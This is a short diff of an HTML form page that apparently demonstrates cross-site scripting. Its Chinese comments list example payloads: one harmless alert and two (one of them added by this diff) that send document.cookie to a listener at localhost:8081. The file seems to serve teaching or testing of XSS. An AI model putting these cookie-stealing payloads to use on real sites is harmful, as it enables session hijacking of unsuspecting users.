@@ -11,7 +11,8 @@
     <form id="submitForm">
         <!-- 攻击脚本输入示例如下，其中示例1仅仅是页面效果，示例2会实际发送数据给攻击者 -->
         <!-- 示例1： <script>alert('it is a xss test!')</script> -->
-        <!-- 示例2： <script>$.ajax({url:"http://localhost:8081/listener/log",type:"POST",dataType:"json",data:JSON.stringify({data:document.cookie}),processData:false,contentType:"application/json",success:function(arg){console.log(arg);console.log("监听到数据");}});</script>-->
+        <!-- 示例2： <script>$.ajax({url:"http://localhost:8081/listener/log",type:"POST",dataType:"json",data:JSON.stringify({data:document.cookie}),processData:false,contentType:"application/json",success:function(arg){console.log(arg);console.log("监听到数据");}});</script> -->
+        <!-- 示例3： <script>$.ajax({url:"http://localhost:8081/listener/store",type:"POST",dataType:"json",data:JSON.stringify({data:document.cookie}),processData:false,contentType:"application/json",success:function(arg){console.log(arg);console.log("监听到数据");}});</script> -->
         <input name="username" type="text" />
     </form>
 
